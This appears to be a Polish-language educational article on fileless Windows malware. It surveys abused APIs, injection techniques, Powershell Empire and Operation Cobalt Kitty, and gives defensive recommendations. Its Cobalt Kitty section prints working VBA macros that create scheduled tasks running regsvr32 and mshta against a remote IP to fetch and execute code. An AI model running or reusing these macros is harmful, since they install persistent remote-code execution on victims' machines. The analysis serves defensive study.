# Fileless Malware w systemach Windows: Analiza techniczna i spostrzeżenia

---
    
## Spis treści
    
1. [Wprowadzenie](#wprowadzenie)
2. [Zrozumienie złośliwego oprogramowania bezplikowego](#zrozumienie-złośliwego-oprogramowania-bezplikowego)
   - [Definicja i charakterystyka](#definicja-i-charakterystyka)
   - [Powszechnie stosowane techniki](#powszechnie-stosowane-techniki)
3. [Kluczowe funkcje Windows wykorzystywane przez Fileless Malware](#kluczowe-funkcje-windows-wykorzystywane-przez-fileless-malware)
   - [Funkcje zarządzania pamięcią](#funkcje-zarządzania-pamięcią)
     - [`VirtualAlloc` i `VirtualAllocEx`](#virtualalloc-i-virtualallocex)
     - [`VirtualProtect` i `VirtualProtectEx`](#virtualprotect-i-virtualprotectex)
   - [Funkcje zarządzania wątkami](#funkcje-zarządzania-wątkami)
     - [`CreateThread` i `CreateRemoteThread`](#createthread-i-createremotethread)
     - [`RtlUserThreadStart`](#rtluserthreadstart)
     - [`CreateProcessA`](#createprocessa)
   - [Instrumentacja zarządzania Windows (WMI)](#instrumentacja-zarządzania-windows-wmi)
   - [PowerShell i platforma .NET](#powershell-i-platforma-net)
4. [Mechanizmy wykonywania kodu w pamięci](#mechanizmy-wykonywania-kodu-w-pamięci)
   - [Techniki wstrzykiwania kodu](#techniki-wstrzykiwania-kodu)
     - [Reflect DLL Injection](#reflect-dll-injection)
     - [Process Hollowing](#process-hollowing)
   - [Wykonywanie za pomocą silników skryptowych](#wykonywanie-za-pomocą-silników-skryptowych)
     - [Skrypty PowerShell](#skrypty-powershell)
     - [Wykonywanie oparte na WMI](#wykonywanie-oparte-na-wmi)
5. [Studia przypadków Fileless Malware](#studia-przypadków-fileless-malware)
   - [Powershell Empire](#powershell-empire)
     - [Mechanizm działania](#mechanizm-działania)
   - [Operacja Cobalt Kitty](#operacja-cobalt-kitty)
     - [Przegląd ataku](#przegląd-ataku)
     - [Analiza techniczna](#analiza-techniczna)
6. [Związek między funkcjami Windows](#związek-między-funkcjami-windows)
   - [`RtlUserThreadStart` i funkcje alokacji pamięci](#rtluserthreadstart-i-funkcje-alokacji-pamięci)
   - [Implementacja wątków w .NET](#implementacja-wątków-w-net)
7. [Kompleksowa lista funkcji używanych przez Fileless Malware](#kompleksowa-lista-funkcji-używanych-przez-fileless-malware)
8. [Środki obronne i zalecenia](#środki-obronne-i-zalecenia)
   - [Strategie monitorowania i wykrywania](#strategie-monitorowania-i-wykrywania)
   - [Najlepsze praktyki w zakresie wzmacniania systemu](#najlepsze-praktyki-w-zakresie-wzmacniania-systemu)
9. [Wniosek](#wniosek)
10. [Bibliografia](#bibliografia)
11. [Zastrzeżenie](#zastrzeżenie)
    
---

## Wprowadzenie

Fileless malware, czyli złośliwe oprogramowanie bezplikowe, stanowi poważne wyzwanie dla współczesnych systemów bezpieczeństwa. W przeciwieństwie do tradycyjnego malware, nie zapisuje swojego kodu na dysku twardym, co utrudnia jego wykrycie przez antywirusy oparte na sygnaturach plików. Zamiast tego, działa bezpośrednio w pamięci operacyjnej (RAM) i często wykorzystuje pospolite narzędzia systemowe do przeprowadzania złośliwych działań.

**Mechanizmy Wprowadzania Kodu do Pamięci i Jego Wykonywanie**

1. **Wykorzystanie Wbudowanych Narzędzi Systemowych**
   
   - **PowerShell**: Fileless malware często korzysta z Windows PowerShell, potężnego narzędzia skryptowego wbudowanego w system Windows. Atakujący mogą dostarczyć złośliwe polecenia PowerShell poprzez różne wektory ataku (np. złośliwe dokumenty, skrypty, e-maile), które są następnie uruchamiane w pamięci.
   
     *Przykład*: Malware **Powershell Empire** wykorzystuje PowerShell do wykonywania złośliwych skryptów bez pozostawiania śladów na dysku.
   
   - **Windows Management Instrumentation (WMI)**: WMI umożliwia zarządzanie komponentami systemu Windows. Atakujący mogą użyć WMI do uruchamiania złośliwych skryptów w pamięci.
   
     *Przykład*: **Duqu 2.0** używa WMI do rozprzestrzeniania się po sieci i wykonywania złośliwego kodu w pamięci.

2. **Iniekcja Kodu do Pamięci Procesów**
   
   - **Reflective DLL Injection**: Technika polegająca na wstrzykiwaniu biblioteki DLL bezpośrednio do pamięci procesu, bez zapisywania jej na dysku. Pozwala to na uruchomienie złośliwych funkcji w kontekście legalnego procesu.
   
     *Przykład*: **Kovter** to malware, które wykorzystuje tę technikę do ukrywania się i unikania detekcji.
   
   - **Process Hollowing**: Atakujący tworzą nowy proces (np. legalny proces systemowy), a następnie zastępują jego pamięć własnym złośliwym kodem.
   
     *Przykład*: **Carbanak** używa process hollowing do kradzieży danych finansowych z instytucji bankowych.

3. **Wykorzystanie Dokumentów z Makrami**
   
   - **Złośliwe Makra w Dokumentach Office**: Atakujący mogą osadzić złośliwe makra w dokumentach Microsoft Office, które po otwarciu przez ofiarę uruchamiają kod w pamięci.
   
     *Przykład*: **Emotet** często dystrybuuje się poprzez zainfekowane dokumenty Word z włączonymi makrami, które pobierają i uruchamiają złośliwy kod w pamięci.

4. **Eksploatacja Luk Bezpieczeństwa**
   
   - **Ataki typu Remote Code Execution (RCE)**: Wykorzystanie podatności w aplikacjach lub systemach operacyjnych pozwala atakującemu na uruchomienie kodu w pamięci bezpośrednio przez sieć.
   
     *Przykład*: **EternalBlue**, exploit wykorzystany przez **WannaCry**, umożliwiał zdalne uruchomienie kodu w pamięci systemów Windows.

5. **Persistencja Bezplikowa**
   
   - **Rejestr Systemowy**: Złośliwy kod może być przechowywany w kluczach rejestru i uruchamiany przy starcie systemu, bez potrzeby zapisywania na dysku.
   
     *Przykład*: **Poweliks** przechowuje złośliwy kod w rejestrze, uruchamiając go za pomocą PowerShell przy każdym starcie systemu.

**Przykłady Fileless Malware**

1. **Poweliks**
   
   - **Opis**: Jeden z pierwszych szeroko znanych fileless malware. Przechowuje złośliwy kod w rejestrze systemowym i używa skryptów PowerShell do jego wykonania.
   
   - **Mechanizm Działania**:
     - Dostarczany poprzez złośliwe załączniki e-mail lub exploit kits.
     - Tworzy klucze rejestru zawierające zakodowany złośliwy kod.
     - Używa PowerShell do dekodowania i uruchamiania kodu w pamięci.

2. **Kovter**
   
   - **Opis**: Malware znane z działania bez zapisów na dysku, początkowo jako adware, później ewoluowało do bardziej złośliwych działań.
   
   - **Mechanizm Działania**:
     - Wykorzystuje techniki iniekcji kodu i skrypty PowerShell.
     - Zapisuje złośliwy kod w rejestrze.
     - Używa scheduled tasks do utrzymania persistencji.

3. **Duqu 2.0**
   
   - **Opis**: Zaawansowane narzędzie szpiegowskie, przypisywane grupie związanej z państwowym aktorem.
   
   - **Mechanizm Działania**:
     - Wykorzystuje exploity zero-day do infekcji systemów.
     - Nie zapisuje plików na dysku; działa w pamięci.
     - Używa WMI i RPC do rozprzestrzeniania się i komunikacji.

4. **FIN7/Carbanak**
   
   - **Opis**: Grupa cyberprzestępcza atakująca instytucje finansowe na całym świecie.
   
   - **Mechanizm Działania**:
     - Wykorzystuje złośliwe e-maile z dokumentami zawierającymi makra.
     - Makra uruchamiają skrypty PowerShell w pamięci.
     - Używa technik iniekcji kodu i process hollowing.

---

## Kluczowe funkcje Windows wykorzystywane przez Fileless Malware

[Powrót na górę](#fileless-malware-w-systemach-windows-analiza-techniczna-i-spostrzeżenia)

### Funkcje zarządzania pamięcią

#### `VirtualAlloc` i `VirtualAllocEx`

- **Cel:** Alokują lub rezerwują pamięć w wirtualnej przestrzeni adresowej procesu.
- **Wykorzystanie przez złośliwe oprogramowanie:** Alokują obszary pamięci wykonawczej do przechowywania i uruchamiania złośliwego kodu.

#### `VirtualProtect` i `VirtualProtectEx`

- **Cel:** Zmieniać ochronę na regionie zaangażowanych stron pamięci.
- **Wykorzystanie przez złośliwe oprogramowanie:** Modyfikują uprawnienia pamięci do wykonywania kodu w wcześniej niewykonywalnych regionach.

### Funkcje zarządzania wątkami

#### `CreateThread` i `CreateRemoteThread`

- **Cel:** Tworzą nowy wątek w obrębie procesu wywołującego lub zdalnego procesu.
- **Wykorzystanie przez złośliwe oprogramowanie:** Wykonują złośliwy kod w nowym wątku, często w innym procesie.

#### `RtlUserThreadStart`

- **Cel:** Funkcja wewnętrzna używana do rozpoczęcia wykonywania nowego wątku w trybie użytkownika.
- **Wykorzystanie przez złośliwe oprogramowanie:** Pośrednio zaangażowana, gdy złośliwe oprogramowanie tworzy wątki na niższym poziomie.

#### `CreateProcessA`

- **Cel:** Tworzy nowy proces oraz jego główny wątek. Funkcja ta może być użyta do uruchamiania aplikacji z określonymi parametrami.
- **Wykorzystanie przez złośliwe oprogramowanie:** Atakujący wykorzystują `CreateProcessA` do uruchamiania złośliwych poleceń lub tworzenia harmonogramowanych zadań (scheduled tasks) bez zapisywania plików na dysku.

##### **Przykład Implementacji `CreateProcessA` w Ataku Fileless Malware (Cobalt Kitty)**

```vb
Option Explicit

' Deklaracja funkcji CreateProcessA z WinAPI
Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
    ByVal lpApplicationName As String, _
    ByVal lpCommandLine As String, _
    ByVal lpProcessAttributes As LongPtr, _
    ByVal lpThreadAttributes As LongPtr, _
    ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As LongPtr, _
    ByVal lpCurrentDirectory As String, _
    lpStartupInfo As STARTUPINFO, _
    lpProcessInformation As PROCESS_INFORMATION) As Long

' Struktura STARTUPINFO
Private Type STARTUPINFO
    cb As Long
    lpReserved As LongPtr
    lpDesktop As LongPtr
    lpTitle As LongPtr
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As LongPtr
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

' Struktura PROCESS_INFORMATION
Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

' Funkcja do usunięcia uchwytu procesu
Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long

Sub CreateScheduledTaskWithCreateProcessA()
    Dim sCMDLine As String
    Dim si As STARTUPINFO
    Dim pi As PROCESS_INFORMATION
    Dim lSuccess As Long
    
    ' Definicja polecenia CMD do utworzenia zadania
    sCMDLine = "schtasks /create /sc MINUTE /tn ""Power Efficiency Diagnostics"" /tr ""regsvr32.exe /s /n /u /i:http://110.10.179.65:80/download/microsoftv.jpg scrobj.dll"" /mo 15 /f"
    
    ' Inicjalizacja struktury STARTUPINFO
    si.cb = Len(si)
    
    ' Uruchomienie polecenia za pomocą CreateProcessA
    lSuccess = CreateProcessA(vbNullString, sCMDLine, 0, 0, False, NORMAL_PRIORITY_CLASS, 0, vbNullString, si, pi)
    
    ' Sprawdzenie czy zadanie zostało utworzone pomyślnie
    If lSuccess = 0 Then
        MsgBox "Nie udało się utworzyć zadania", vbCritical
    Else
        MsgBox "Zadanie zostało utworzone pomyślnie", vbInformation
    End If

    ' Zamknięcie uchwytów procesu i wątku
    If pi.hProcess <> 0 Then CloseHandle pi.hProcess
    If pi.hThread <> 0 Then CloseHandle pi.hThread
End Sub
```

**Analiza Przykładu:**

1. **Definicja Funkcji `CreateProcessA`:** Deklaracja funkcji z biblioteki `kernel32.dll`, która umożliwia tworzenie nowych procesów.

2. **Tworzenie Harmonogramowanego Zadania:**
   
   - **Polecenie CMD:** Tworzy zadanie harmonogramu o nazwie "Power Efficiency Diagnostics", które co 15 minut uruchamia `regsvr32.exe` z parametrami do pobrania i załadowania zdalnego pliku DLL (`scrobj.dll`) z określonego URL.
   
   - **Bezplikowa Implementacja:** Dzięki użyciu `CreateProcessA`, zadanie jest tworzone bez zapisywania żadnych plików na dysku, co klasyfikuje ten atak jako fileless.

3. **Persistencja i Wykonywanie:**
   
   - **Persistencja:** Zadanie harmonogramu jest skonfigurowane do regularnego wykonywania złośliwego polecenia.
   
   - **Wykonywanie:** `regsvr32.exe` jest legalnym narzędziem systemowym, co utrudnia wykrycie złośliwego działania.

---

### Instrumentacja zarządzania Windows (WMI)

- **Cel:** Zapewnia infrastrukturę dla danych i operacji zarządzania w Windows.
- **Wykorzystanie przez złośliwe oprogramowanie:** Wykonuje kod, przemieszcza się lateralnie w sieciach i utrzymuje trwałość.

### PowerShell i platforma .NET

- **Cel:** Język skryptowy i platforma dla automatyzacji zadań i konfiguracji.
- **Wykorzystanie przez złośliwe oprogramowanie:** Wykonuje skrypty i polecenia w pamięci, pobiera i uruchamia kod bez dotykania dysku.

---

## Mechanizmy wykonywania kodu w pamięci

[Powrót na górę](#fileless-malware-w-systemach-windows-analiza-techniczna-i-spostrzeżenia)

### Techniki wstrzykiwania kodu

#### Reflect DLL Injection

- **Koncepcja:** Reflect DLL Injection to technika polegająca na ładowaniu biblioteki DLL bezpośrednio z pamięci, zamiast z dysku, co utrudnia jej wykrycie. Technika ta została opisana w literaturze fachowej, m.in. w książce "Practical Malware Analysis" autorstwa Michaela Sikorskiego i Andrew Honiga, jako jedna z metod stosowanych do ataków na oprogramowanie poprzez dynamiczne modyfikacje pamięci.
- **Proces:**
  1. Alokacja pamięci za pomocą `VirtualAlloc`.
  2. Kopiowanie DLL do pamięci.
  3. Dostosowanie ochrony pamięci za pomocą `VirtualProtect`.
  4. Wykonanie Entry Point DLL.
  
#### Process Hollowing

- **Koncepcja:** Zastąpienie pospolitego kodu procesu kodem złośliwym.
- **Proces:**
  1. Utworzenie procesu w stanie zawieszonym.
  2. Odmapowanie oryginalnego pliku wykonywalnego z pamięci.
  3. Mapowanie złośliwego kodu do przestrzeni pamięci procesu.
  4. Wznowienie wykonywania procesu.

### Wykonywanie za pomocą silników skryptowych

#### Skrypty PowerShell

- **Wykorzystanie:** Uruchamianie złośliwych poleceń i skryptów bezpośrednio w pamięci.
- **Techniki:**
  - Używanie `Invoke-Expression` do wykonywania kodu.
  - Obfuskacja skryptów w celu uniknięcia wykrycia.
  - Ładowanie zestawów za pomocą `System.Reflection`.

#### Wykonywanie oparte na WMI

- **Wykorzystanie:** Wykorzystanie WMI do wykonywania kodu i utrzymywania trwałości.
- **Techniki:**
  - Tworzenie subskrypcji zdarzeń WMI.
  - Wykonywanie poleceń na zdalnych systemach.

---

## Studia przypadków Fileless Malware

[Powrót na górę](#fileless-malware-w-systemach-windows-analiza-techniczna-i-spostrzeżenia)

### Powershell Empire

#### Mechanizm działania

- **Opis:** Otwarty framework post-exploitacyjny.
- **Kluczowe cechy:**
  - Wykonuje agentów PowerShell bez potrzeby użycia `powershell.exe`.
  - Używa zaszyfrowanej komunikacji.
  - Działa w pamięci, unikając zapisów na dysku.

[Szczegółowa analiza](#mechanizm-działania)

### Operacja Cobalt Kitty

#### Przegląd ataku

- **Sprawcy:** Grupa APT znana jako OceanLotus lub APT32.
- **Cele:** Przedsiębiorstwa w Azji Południowo-Wschodniej.
- **Cele ataku:** Długoterminowa działalność szpiegowska i eksfiltracja danych.

[Szczegółowa analiza](operacja-cobalt-kitty.md#przegląd-ataku)

#### Analiza techniczna

- **Początkowy wektor infekcji:** E-maile spear-phishingowe z złośliwymi dokumentami.
- **Użyte techniki:**
  - Fileless Malware wykonywane za pomocą PowerShell.
  - Wykonywanie kodu w pamięci przy użyciu `VirtualAlloc`.
  - Utrzymanie trwałości poprzez subskrypcje zdarzeń WMI.
  - **Tworzenie harmonogramowanych zadań przy użyciu `CreateProcessA` i XML.**

##### **Przykłady Implementacji**

1. **Tworzenie Harmonogramowanego Zadania za pomocą `CreateProcessA`**

   ```vb
   Option Explicit

   ' Deklaracja funkcji CreateProcessA z WinAPI
   Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
       ByVal lpApplicationName As String, _
       ByVal lpCommandLine As String, _
       ByVal lpProcessAttributes As LongPtr, _
       ByVal lpThreadAttributes As LongPtr, _
       ByVal bInheritHandles As Long, _
       ByVal dwCreationFlags As Long, _
       ByVal lpEnvironment As LongPtr, _
       ByVal lpCurrentDirectory As String, _
       lpStartupInfo As STARTUPINFO, _
       lpProcessInformation As PROCESS_INFORMATION) As Long

   ' Struktura STARTUPINFO
   Private Type STARTUPINFO
       cb As Long
       lpReserved As LongPtr
       lpDesktop As LongPtr
       lpTitle As LongPtr
       dwX As Long
       dwY As Long
       dwXSize As Long
       dwYSize As Long
       dwXCountChars As Long
       dwYCountChars As Long
       dwFillAttribute As Long
       dwFlags As Long
       wShowWindow As Integer
       cbReserved2 As Integer
       lpReserved2 As LongPtr
       hStdInput As LongPtr
       hStdOutput As LongPtr
       hStdError As LongPtr
   End Type

   ' Struktura PROCESS_INFORMATION
   Private Type PROCESS_INFORMATION
       hProcess As LongPtr
       hThread As LongPtr
       dwProcessId As Long
       dwThreadId As Long
   End Type

   ' Funkcja do usunięcia uchwytu procesu
   Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long

   Sub CreateScheduledTaskWithCreateProcessA()
       Dim sCMDLine As String
       Dim si As STARTUPINFO
       Dim pi As PROCESS_INFORMATION
       Dim lSuccess As Long
       
       ' Definicja polecenia CMD do utworzenia zadania
       sCMDLine = "schtasks /create /sc MINUTE /tn ""Power Efficiency Diagnostics"" /tr ""regsvr32.exe /s /n /u /i:http://110.10.179.65:80/download/microsoftv.jpg scrobj.dll"" /mo 15 /f"
       
       ' Inicjalizacja struktury STARTUPINFO
       si.cb = Len(si)
       
       ' Uruchomienie polecenia za pomocą CreateProcessA
       lSuccess = CreateProcessA(vbNullString, sCMDLine, 0, 0, False, NORMAL_PRIORITY_CLASS, 0, vbNullString, si, pi)
       
       ' Sprawdzenie czy zadanie zostało utworzone pomyślnie
       If lSuccess = 0 Then
           MsgBox "Nie udało się utworzyć zadania", vbCritical
       Else
           MsgBox "Zadanie zostało utworzone pomyślnie", vbInformation
       End If

       ' Zamknięcie uchwytów procesu i wątku
       If pi.hProcess <> 0 Then CloseHandle pi.hProcess
       If pi.hThread <> 0 Then CloseHandle pi.hThread
   End Sub
   ```

   **Opis Przykładu:**

   - **Funkcja `CreateProcessA`:** Używana do tworzenia nowego procesu, w tym przypadku `schtasks`, który tworzy harmonogramowane zadanie uruchamiające `regsvr32.exe` z określonymi parametrami.
   
   - **Polecenie CMD:** `schtasks /create /sc MINUTE /tn "Power Efficiency Diagnostics" /tr "regsvr32.exe /s /n /u /i:http://110.10.179.65:80/download/microsoftv.jpg scrobj.dll" /mo 15 /f`
     - Tworzy zadanie, które co 15 minut uruchamia `regsvr32.exe` z parametrami do załadowania zdalnego pliku DLL (`scrobj.dll`) z określonego URL.
     - **Bezplikowa Implementacja:** Dzięki użyciu `CreateProcessA`, zadanie jest tworzone bez zapisywania żadnych plików na dysku, co klasyfikuje ten atak jako fileless.

2. **Tworzenie Harmonogramowanego Zadania za pomocą XML**

   ```vb
   Sub CreateScheduledTaskXML()
       Dim tstr As String
       Dim XMLStr As String
       
       ' Budowanie XML-a dla zadania
       tstr = "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">" & vbCrLf
       tstr = tstr & "  <Triggers>" & vbCrLf
       tstr = tstr & "    <TimeTrigger>" & vbCrLf
       tstr = tstr & "      <Repetition>" & vbCrLf
       tstr = tstr & "        <Interval>PT15M</Interval>" & vbCrLf
       tstr = tstr & "      </Repetition>" & vbCrLf
       tstr = tstr & "      <StartBoundary>2024-01-01T00:00:00</StartBoundary>" & vbCrLf
       tstr = tstr & "    </TimeTrigger>" & vbCrLf
       tstr = tstr & "  </Triggers>" & vbCrLf
       tstr = tstr & "  <Actions Context=""Author"">" & vbCrLf
       tstr = tstr & "    <Exec>" & vbCrLf
       tstr = tstr & "      <Command>mshta.exe</Command>" & vbCrLf
       tstr = tstr & "      <Arguments>about:""<script language=""vbscript"">" & vbCrLf
       tstr = tstr & "      src=""http://110.10.179.65:80/download/microsoftfp.jpg"";code close</script>""</Arguments>" & vbCrLf
       tstr = tstr & "    </Exec>" & vbCrLf
       tstr = tstr & "  </Actions>" & vbCrLf
       tstr = tstr & "</Task>"

       ' Zapisz XML jako plik tymczasowy
       Dim fso As Object
       Dim tempFile As String
       Set fso = CreateObject("Scripting.FileSystemObject")
       tempFile = Environ("TEMP") & "\ScheduledTask.xml"
       Dim file As Object
       Set file = fso.CreateTextFile(tempFile, True)
       file.WriteLine tstr
       file.Close

       ' Wykonaj polecenie schtasks z wykorzystaniem pliku XML
       Dim sCmd As String
       sCmd = "schtasks /create /tn ""Power Efficiency Diagnostics XML"" /xml """ & tempFile & """ /f"
       Shell sCmd, vbNormalFocus

       ' Usuń plik XML po utworzeniu zadania
       fso.DeleteFile tempFile, True

       MsgBox "Zadanie zostało utworzone pomyślnie przy użyciu XML", vbInformation
   End Sub
   ```

   **Opis Przykładu:**

   - **Tworzenie XML:** Skrypt buduje plik XML definiujący harmonogramowane zadanie, które co 15 minut uruchamia `mshta.exe` z wbudowanym skryptem VBScript.
   
   - **Wykorzystanie `mshta.exe`:** Używany do uruchomienia HTML Application (HTA), który może zawierać złośliwy kod, działający bez zapisów na dysku.
   
   - **Bezplikowa Implementacja:** Plik XML jest tworzony i usuwany po użyciu, co minimalizuje ślady na systemie.

**Integracja Przykładów w Kontekście Cobalt Kitty:**

Podczas operacji Cobalt Kitty, wykorzystano powyższe techniki do tworzenia harmonogramowanych zadań, które umożliwiały zdalne wykonywanie złośliwego kodu bez pozostawiania plików na dysku. Dzięki użyciu funkcji `CreateProcessA` oraz harmonogramowanych zadań zdalnie ładowanych DLL i skryptów VBScript, malware utrzymywało persistencję i wykorzystywało legalne narzędzia systemowe do wykonywania swoich działań.

---

## Związek między funkcjami Windows

[Powrót na górę](#fileless-malware-w-systemach-windows-analiza-techniczna-i-spostrzeżenia)

### `RtlUserThreadStart` i funkcje alokacji pamięci

- **Interakcja:** Podczas gdy `RtlUserThreadStart` jest używana wewnętrznie do uruchamiania wątków, funkcje alokacji pamięci, takie jak `VirtualAlloc`, są używane do przygotowania regionów pamięci wykonywalnej.
- **Wykorzystanie przez złośliwe oprogramowanie:** Atakujący mogą pośrednio wykorzystywać `RtlUserThreadStart` podczas tworzenia wątków do wykonywania złośliwego kodu.

### Implementacja wątków w .NET

- **Platforma .NET:** Zapewnia zarządzane wątki poprzez `System.Threading.Thread`.
- **Interakcja z Windows API:** W tle wątki .NET interakcjonują z mechanizmami wątków Windows.
- **Implikacje dla złośliwego oprogramowania:** Złośliwe oprogramowanie wykorzystujące .NET może korzystać z wątków do wykonywania kodu w pamięci.

---

## Kompleksowa lista funkcji używanych przez Fileless Malware

[Powrót na górę](#fileless-malware-w-systemach-windows-analiza-techniczna-i-spostrzeżenia)

Szczegółowe zestawienie funkcji API Windows powszechnie wykorzystywanych przez Fileless Malware:

- **Funkcje pamięci:**
  - `VirtualAlloc`, `VirtualAllocEx`
  - `VirtualProtect`, `VirtualProtectEx`
- **Funkcje procesów i wątków:**
  - `CreateThread`, `CreateRemoteThread`
  - `NtCreateThreadEx`
  - `RtlCreateUserThread`
  - `CreateProcessA`
- **Funkcje wstrzykiwania i wykonywania:**
  - `WriteProcessMemory`
  - `SetThreadContext`, `GetThreadContext`
  - `QueueUserAPC`
- **Funkcje ładowania bibliotek:**
  - `LoadLibrary`, `LoadLibraryEx`
  - `GetProcAddress`
- **Skrypty i automatyzacja:**
  - Cmdlety PowerShell (np. `Invoke-Expression`)
  - Klasy i metody WMI (np. `Win32_Process`, `__EventFilter`)

[Pełna lista z opisami](#lista-funkcji)

---

## Środki obronne i zalecenia

[Powrót na górę](#fileless-malware-w-systemach-windows-analiza-techniczna-i-spostrzeżenia)

### Strategie monitorowania i wykrywania

- **Implementacja narzędzi Endpoint Detection and Response (EDR):**
  - Monitorowanie wykorzystania pamięci i zachowań procesów.
- **Włączanie logowania PowerShell:**
  - Śledzenie wykonywania skryptów i wykrywanie obfuskowanych poleceń.
- **Monitorowanie aktywności WMI:**
  - Wykrywanie nietypowych subskrypcji zdarzeń WMI i zdalnych wykonań.

[Dowiedz się więcej](#strategie-monitorowania-i-wykrywania)

### Najlepsze praktyki w zakresie wzmacniania systemu

- **Zastosowanie zasady najmniejszych uprawnień:**
  - Ograniczenie uprawnień użytkowników do niezbędnego minimum.
- **Regularne aktualizacje systemów:**
  - Szybkie łatanie podatności.
- **Ograniczenie silników skryptowych:**
  - Ograniczenie użycia PowerShell i WMI do uprawnionego personelu.

[Dowiedz się więcej](#najlepsze-praktyki-w-zakresie-wzmacniania-systemu)

---

## Wniosek

[Powrót na górę](#fileless-malware-w-systemach-windows-analiza-techniczna-i-spostrzeżenia)

Fileless Malware stanowi znaczącą ewolucję w zagrożeniach cybernetycznych, wykorzystując pospolite funkcjonalności systemu do potajemnego wykonywania złośliwych działań. Zrozumienie podstawowych funkcji Windows i mechanizmów wykorzystywanych przez takie złośliwe oprogramowanie jest kluczowe dla opracowywania skutecznych strategii obronnych. Poprzez wdrażanie solidnego monitorowania, przestrzeganie najlepszych praktyk i promowanie kultury świadomości bezpieczeństwa, organizacje mogą zmniejszyć ryzyko stwarzane przez te zaawansowane ataki.

---

## Bibliografia

[Powrót na górę](#fileless-malware-w-systemach-windows-analiza-techniczna-i-spostrzeżenia)

1. **Dokumentacja Microsoft:**
   - [Funkcja VirtualAlloc](https://learn.microsoft.com/pl-pl/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
   - [Funkcja CreateThread](https://learn.microsoft.com/pl-pl/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
   - [Instrumentacja zarządzania Windows](https://learn.microsoft.com/pl-pl/windows/win32/wmisdk/wmi-start-page)
   - [Funkcja CreateProcessA](https://learn.microsoft.com/pl-pl/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
2. **Analiza Cybereason Labs:**
   - *Operation Cobalt Kitty - Part 1* [PDF](https://www.cybereason.com/hubfs/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty-Part1.pdf)
3. **Artykuły z badań bezpieczeństwa:**
   - FireEye: *APT32 i krajobraz zagrożeń w Azji Południowo-Wschodniej*
   - Kaspersky Lab: *OceanLotus i wzrost ataków APT w Azji*

---

## Zastrzeżenie

[Powrót na górę](#fileless-malware-w-systemach-windows-analiza-techniczna-i-spostrzeżenia)

> Niniejszy dokument jest przeznaczony wyłącznie do celów edukacyjnych i informacyjnych. Analiza technik złośliwego oprogramowania ma na celu poprawę obrony cyberbezpieczeństwa i świadomości. Nieautoryzowane tworzenie, dystrybucja lub użycie złośliwego oprogramowania jest nielegalne i nieetyczne. Zawsze przestrzegaj obowiązujących przepisów prawa i standardów etycznych podczas korzystania z informacji o cyberbezpieczeństwie.
>
> **Uwaga:** Przedstawiona treść jest syntezą dyskusji na temat Fileless Malware, funkcji systemu Windows wykorzystywanych przez atakujących oraz konkretnych studiów przypadków, takich jak Operacja Cobalt Kitty. Jest ona zorganizowana w celu ułatwienia głębszej eksploracji każdego tematu poprzez hiperłącza i uporządkowane sekcje, umożliwiając czytelnikom nawigację od ogólnych pojęć do szczegółowych analiz technicznych.

---
